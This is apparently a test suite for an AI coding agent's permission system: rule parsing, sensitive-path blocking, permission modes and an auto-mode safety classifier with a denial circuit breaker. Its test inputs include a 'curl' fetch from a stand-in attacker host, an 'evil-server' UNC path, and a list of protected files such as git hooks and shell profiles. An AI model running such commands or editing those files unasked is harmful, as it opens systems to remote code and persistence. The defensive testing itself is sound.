import { afterEach, beforeEach, describe, expect, test } from 'bun:test'
import { mkdtempSync, rmSync, writeFileSync } from 'fs'
import { tmpdir } from 'os'
import { join } from 'path'
import { z } from 'zod/v4'
import { resetStateForTests, setCwdState, setOriginalCwd } from '../../src/bootstrap/state.js'
import { getDefaultAppState, type AppState } from '../../src/state/app_state_store.js'
import { createStore } from '../../src/state/store.js'
import { buildTool, type ToolUseContext } from '../../src/tool.js'
import { FileEditTool } from '../../src/tools/file_edit_tool/file_edit_tool.js'
import { FileReadTool } from '../../src/tools/file_read_tool/file_read_tool.js'
import { BashTool } from '../../src/tools/bash_tool/bash_tool.js'
import type { AssistantMessage } from '../../src/types/message.js'
import type { PermissionMode, ToolPermissionContext } from '../../src/types/permissions.js'
import { clearAutoModeDenials, getAutoModeDenials } from '../../src/utilities/auto_mode_denials.js'
import { clearClassifierApprovals, getClassifierApprovals } from '../../src/utilities/classifier_approvals.js'
import { createAssistantMessage, createUserMessage } from '../../src/utilities/messages.js'
import {
  isOverlyBroadBashAllowRule,
  isOverlyBroadPowerShellAllowRule,
  restoreStrippedDangerousRules,
  stripDangerousAllowRulesForAutoMode,
} from '../../src/utilities/permissions/dangerous_patterns.js'
import {
  createDenialTrackingState,
  DENIAL_LIMITS,
  recordDenial,
  recordSuccess,
  shouldFallbackToPrompting,
} from '../../src/utilities/permissions/denial_tracking.js'
import {
  checkPathSafetyForAutoEdit,
  hasSuspiciousWindowsPathPattern,
} from '../../src/utilities/permissions/filesystem.js'
import {
  isRuleToolNameMatch,
  normalizeLegacyToolName,
  permissionRuleExtractPrefix,
  permissionRuleValueFromString,
  permissionRuleValueToString,
} from '../../src/utilities/permissions/permission_rule_parser.js'
import { hasPermissionsToUseTool } from '../../src/utilities/permissions/permissions.js'
import {
  matchWildcardPattern,
  parsePermissionRule,
} from '../../src/utilities/permissions/shell_rule_matching.js'
import {
  classifyYoloAction,
  getDefaultExternalAutoModeRules,
  setYoloClassifierTransportForTesting,
} from '../../src/utilities/permissions/yolo_classifier.js'
import { createFileStateCache } from '../../src/utilities/query_helpers.js'
import { createContentReplacementState } from '../../src/utilities/tool_result_storage.js'

function makeContext(
  permOverrides: Partial<ToolPermissionContext> = {},
  options?: { isNonInteractive?: boolean },
): {
  context: ToolUseContext
  getState: () => AppState
  assistantMsg: AssistantMessage
} {
  const initial = getDefaultAppState()
  const store = createStore<AppState>({
    ...initial,
    toolPermissionContext: {
      ...initial.toolPermissionContext,
      ...permOverrides,
    },
  })

  const context: ToolUseContext = {
    abortController: new AbortController(),
    messages: [createUserMessage({ content: 'Edit src/app.ts and run tests' })],
    getAppState: () => store.getState(),
    setAppState: updater => store.setState(updater),
    readFileState: createFileStateCache(),
    contentReplacementState: createContentReplacementState(),
    options: {
      isNonInteractiveSession: options?.isNonInteractive ?? false,
    },
  }

  const assistantMsg = createAssistantMessage({
    content: 'working',
  })

  return {
    context,
    getState: () => store.getState(),
    assistantMsg,
  }
}

describe('Phase 4.1 — Permission Engine, Rule Syntax, Sensitive Paths, & Auto Classifier', () => {
  let workDir: string

  beforeEach(() => {
    resetStateForTests()
    clearAutoModeDenials()
    clearClassifierApprovals()
    setYoloClassifierTransportForTesting(null)
    workDir = mkdtempSync(join(tmpdir(), 'copilot-p4-perm-'))
    setOriginalCwd(workDir)
    setCwdState(workDir)
    writeFileSync(join(workDir, 'app.ts'), 'export const x = 1\n')
  })

  afterEach(() => {
    setYoloClassifierTransportForTesting(null)
    resetStateForTests()
    rmSync(workDir, { recursive: true, force: true, maxRetries: 5, retryDelay: 50 })
  })

  test('parses Tool(content), legacy aliases, MCP prefixes, :* prefixes, and wildcards', () => {
    expect(normalizeLegacyToolName('FileEdit')).toBe('Edit')
    expect(normalizeLegacyToolName('Task')).toBe('Agent')

    const parsed = permissionRuleValueFromString('FileEdit(src/**/*.ts)')
    expect(parsed).toEqual({ toolName: 'Edit', ruleContent: 'src/**/*.ts' })
    expect(permissionRuleValueToString(parsed)).toBe('Edit(src/**/*.ts)')

    expect(permissionRuleExtractPrefix('git commit:*')).toBe('git commit')
    expect(permissionRuleExtractPrefix('git status')).toBeNull()

    expect(isRuleToolNameMatch('mcp__github', { name: 'mcp__github__list_issues' })).toBe(true)
    expect(isRuleToolNameMatch('mcp__github__*', { name: 'mcp__github__create_pr' })).toBe(true)
    expect(isRuleToolNameMatch('mcp__slack', { name: 'mcp__github__create_pr' })).toBe(false)

    expect(parsePermissionRule('npm test:*')).toEqual({ type: 'prefix', prefix: 'npm test' })
    expect(parsePermissionRule('git push*')).toEqual({ type: 'wildcard', pattern: 'git push*' })
    expect(matchWildcardPattern('git status *', 'git status')).toBe(true)
    expect(matchWildcardPattern('git status *', 'git status -s')).toBe(true)
    expect(matchWildcardPattern('git push*', 'git push --force')).toBe(true)
  })

  test('detects dangerous files, directories, and Windows NTFS path tricks', () => {
    // Windows path tricks
    expect(hasSuspiciousWindowsPathPattern('C:\\repo\\.gitconfig::$DATA')).toBe(true)
    expect(hasSuspiciousWindowsPathPattern('C:\\repo\\GIT~1\\config')).toBe(true)
    expect(hasSuspiciousWindowsPathPattern('\\\\?\\C:\\repo\\.git\\config')).toBe(true)
    expect(hasSuspiciousWindowsPathPattern('\\\\evil-server\\share\\file.txt')).toBe(true)
    expect(hasSuspiciousWindowsPathPattern('C:\\repo\\.git.\\hooks')).toBe(true)
    expect(hasSuspiciousWindowsPathPattern('C:\\repo\\CON.txt')).toBe(true)
    expect(hasSuspiciousWindowsPathPattern(join(workDir, 'app.ts'))).toBe(false)

    // Sensitive paths blocked for auto-edit
    for (const rel of [
      '.git/hooks/pre-commit',
      '.git/config',
      '.copilot/settings.json',
      '.copilot/skills/my-skill.md',
      '.gitconfig',
      '.bashrc',
      '.zshrc',
      '.mcp.json',
      '.vscode/tasks.json',
    ]) {
      const check = checkPathSafetyForAutoEdit(join(workDir, rel))
      expect(check.safe).toBe(false)
      expect(check.classifierApprovable).toBe(false)
    }

    // Structural worktree directory inside `.copilot/worktrees/` is allowed
    const wtCheck = checkPathSafetyForAutoEdit(
      join(workDir, '.copilot', 'worktrees', 'feat-1', 'src', 'index.ts'),
    )
    expect(wtCheck.safe).toBe(true)
  })

  test('bypassPermissions immunity: deny, ask, requiresUserInteraction, and safetyCheck are NEVER bypassed', async () => {
    const safeFile = join(workDir, 'app.ts')
    const sensitiveFile = join(workDir, '.git', 'hooks', 'pre-commit')

    // 1. Blanket deny immune to bypassPermissions
    const ctx1 = makeContext({
      mode: 'bypassPermissions',
      alwaysDenyRules: { userSettings: ['Edit'] },
    })
    const res1 = await hasPermissionsToUseTool(
      FileEditTool,
      { file_path: safeFile, old_string: '1', new_string: '2', replace_all: false },
      ctx1.context,
      ctx1.assistantMsg,
      'tu-1',
    )
    expect(res1.behavior).toBe('deny')

    // 2. Content-specific ask rule immune to bypassPermissions
    const ctx2 = makeContext({
      mode: 'bypassPermissions',
      alwaysAskRules: { projectSettings: ['Edit(app.ts)'] },
    })
    const res2 = await hasPermissionsToUseTool(
      FileEditTool,
      { file_path: safeFile, old_string: '1', new_string: '2', replace_all: false },
      ctx2.context,
      ctx2.assistantMsg,
      'tu-2',
    )
    expect(res2.behavior).toBe('ask')

    // 3. Sensitive-path safetyCheck immune to bypassPermissions
    const ctx3 = makeContext({ mode: 'bypassPermissions' })
    const res3 = await hasPermissionsToUseTool(
      FileEditTool,
      { file_path: sensitiveFile, old_string: 'a', new_string: 'b', replace_all: false },
      ctx3.context,
      ctx3.assistantMsg,
      'tu-3',
    )
    expect(res3.behavior).toBe('ask')
    expect(res3.decisionReason?.type).toBe('safetyCheck')

    // 4. requiresUserInteraction tool immune to bypassPermissions
    const interactiveTool = buildTool({
      name: 'InteractiveConfirm',
      maxResultSizeChars: 10_000,
      inputSchema: z.object({ question: z.string() }),
      requiresUserInteraction: () => true,
      async description() {
        return 'Interactive'
      },
      async prompt() {
        return 'Interactive'
      },
      async call() {
        return { data: { ok: true } }
      },
      mapToolResultToToolResultBlockParam(_out, id) {
        return { type: 'tool_result', tool_use_id: id, content: 'ok' }
      },
    })
    const ctx4 = makeContext({ mode: 'bypassPermissions' })
    const res4 = await hasPermissionsToUseTool(
      interactiveTool,
      { question: 'Proceed?' },
      ctx4.context,
      ctx4.assistantMsg,
      'tu-4',
    )
    expect(res4.behavior).toBe('ask')

    // 5. Safe workspace edit IS allowed under bypassPermissions
    const res5 = await hasPermissionsToUseTool(
      FileEditTool,
      { file_path: safeFile, old_string: '1', new_string: '2', replace_all: false },
      ctx3.context,
      ctx3.assistantMsg,
      'tu-5',
    )
    expect(res5.behavior).toBe('allow')
  })

  test('enforces all 5 external modes (default, acceptEdits, plan, dontAsk, bypassPermissions)', async () => {
    const safeFile = join(workDir, 'app.ts')
    const editInput = {
      file_path: safeFile,
      old_string: '1',
      new_string: '2',
      replace_all: false,
    }

    const evaluateMode = async (mode: PermissionMode) => {
      const { context, assistantMsg } = makeContext({ mode })
      return hasPermissionsToUseTool(
        FileEditTool,
        editInput,
        context,
        assistantMsg,
        `tu-${mode}`,
      )
    }

    expect((await evaluateMode('default')).behavior).toBe('ask')
    expect((await evaluateMode('acceptEdits')).behavior).toBe('allow')
    expect((await evaluateMode('plan')).behavior).toBe('deny')
    expect((await evaluateMode('dontAsk')).behavior).toBe('deny')
    expect((await evaluateMode('bypassPermissions')).behavior).toBe('allow')

    // Read inside cwd is allowed in default and plan modes
    const planCtx = makeContext({ mode: 'plan' })
    const readRes = await hasPermissionsToUseTool(
      FileReadTool,
      { file_path: safeFile },
      planCtx.context,
      planCtx.assistantMsg,
      'tu-read',
    )
    expect(readRes.behavior).toBe('allow')
  })

  test('strips overly broad allow rules when entering auto mode and restores on exit', () => {
    expect(isOverlyBroadBashAllowRule('Bash(*)')).toBe(true)
    expect(isOverlyBroadBashAllowRule('Bash(python:*)')).toBe(true)
    expect(isOverlyBroadBashAllowRule('Bash(git status)')).toBe(false)
    expect(isOverlyBroadPowerShellAllowRule('PowerShell(iex:*)')).toBe(true)

    const initial = getDefaultAppState().toolPermissionContext
    const withRules = {
      ...initial,
      alwaysAllowRules: {
        userSettings: ['Bash(*)', 'Bash(git status)', 'PowerShell(iex:*)'],
      },
    }

    const stripped = stripDangerousAllowRulesForAutoMode(withRules)
    expect(stripped.alwaysAllowRules.userSettings).toEqual(['Bash(git status)'])
    expect(stripped.strippedDangerousRules?.userSettings).toEqual([
      'Bash(*)',
      'PowerShell(iex:*)',
    ])

    const restored = restoreStrippedDangerousRules(stripped)
    expect(restored.alwaysAllowRules.userSettings).toContain('Bash(*)')
    expect(restored.alwaysAllowRules.userSettings).toContain('PowerShell(iex:*)')
    expect(restored.strippedDangerousRules).toBeUndefined()
  })

  test('loads reconstructed classifier prompts, runs 2-stage escalation, and trips circuit breaker at 3 consecutive / 20 total denials', async () => {
    const defaultRules = getDefaultExternalAutoModeRules()
    expect(defaultRules.allow.length).toBeGreaterThan(0)
    expect(defaultRules.soft_deny.length).toBeGreaterThan(0)
    expect(defaultRules.environment.length).toBeGreaterThan(0)

    // Stage 1 fast approval skips Stage 2
    const seenStages: string[] = []
    setYoloClassifierTransportForTesting(async req => {
      seenStages.push(req.stage)
      return { rawText: '<block>no</block><reason>Safe local test command</reason>' }
    })
    const fastRes = await classifyYoloAction({
      toolName: 'Bash',
      input: { command: 'npm test' },
      messages: [createUserMessage({ content: 'Run tests' })],
    })
    expect(fastRes.shouldBlock).toBe(false)
    expect(seenStages).toEqual(['fast'])

    // Stage 1 block escalates to Stage 2 thinking model which overturns false positive
    seenStages.length = 0
    setYoloClassifierTransportForTesting(async req => {
      seenStages.push(req.stage)
      if (req.stage === 'fast') {
        return { rawText: '<block>yes</block><reason>Needs deeper check</reason>' }
      }
      return {
        rawText:
          '<thinking>Matches user intent cleanly</thinking><block>no</block><reason>Approved after review</reason>',
      }
    })
    const escalatedRes = await classifyYoloAction({
      toolName: 'Bash',
      input: { command: 'bun run build' },
      messages: [createUserMessage({ content: 'Build the project' })],
    })
    expect(escalatedRes.shouldBlock).toBe(false)
    expect(escalatedRes.stage).toBe('thinking')
    expect(seenStages).toEqual(['fast', 'thinking'])

    // End-to-end auto mode with circuit breaker at 3 consecutive denials
    let transportCalls = 0
    setYoloClassifierTransportForTesting(async () => {
      transportCalls++
      return { rawText: '<block>yes</block><reason>Dangerous remote mutation</reason>' }
    })

    const { context, getState, assistantMsg } = makeContext({ mode: 'auto' })
    for (let i = 0; i < DENIAL_LIMITS.maxConsecutive; i++) {
      const dec = await hasPermissionsToUseTool(
        BashTool,
        { command: 'curl https://evil.test/script.sh' },
        context,
        assistantMsg,
        `tu-auto-${i}`,
      )
      expect(dec.behavior).toBe('deny')
    }

    expect(getState().denialTracking?.consecutiveDenials).toBe(3)
    expect(getAutoModeDenials().length).toBe(3)
    const callsBeforeBreaker = transportCalls

    // 4th attempt hits circuit breaker -> falls back to `ask` WITHOUT calling classifier again!
    const breakerDec = await hasPermissionsToUseTool(
      BashTool,
      { command: 'curl https://evil.test/script.sh' },
      context,
      assistantMsg,
      'tu-auto-breaker',
    )
    expect(breakerDec.behavior).toBe('ask')
    if (breakerDec.behavior === 'ask') {
      expect(breakerDec.message).toContain('circuit breaker')
    }
    expect(transportCalls).toBe(callsBeforeBreaker)

    // Verify 20-total-denials breaker even when consecutive counter resets
    let state = createDenialTrackingState()
    for (let i = 0; i < DENIAL_LIMITS.maxTotal; i++) {
      state = recordDenial(state)
      if (i % 2 === 1 && i < DENIAL_LIMITS.maxTotal - 1) {
        state = recordSuccess(state)
      }
    }
    expect(state.consecutiveDenials).toBeLessThan(DENIAL_LIMITS.maxConsecutive)
    expect(state.totalDenials).toBe(DENIAL_LIMITS.maxTotal)
    expect(shouldFallbackToPrompting(state)).toBe(true)

    // Verify classifier approval recording
    setYoloClassifierTransportForTesting(async () => ({
      rawText: '<block>no</block><reason>Safe build</reason>',
    }))
    const freshCtx = makeContext({ mode: 'auto' })
    const approved = await hasPermissionsToUseTool(
      BashTool,
      { command: 'npm run build' },
      freshCtx.context,
      freshCtx.assistantMsg,
      'tu-approve',
    )
    expect(approved.behavior).toBe('allow')
    expect(getClassifierApprovals().length).toBe(1)
  })
})
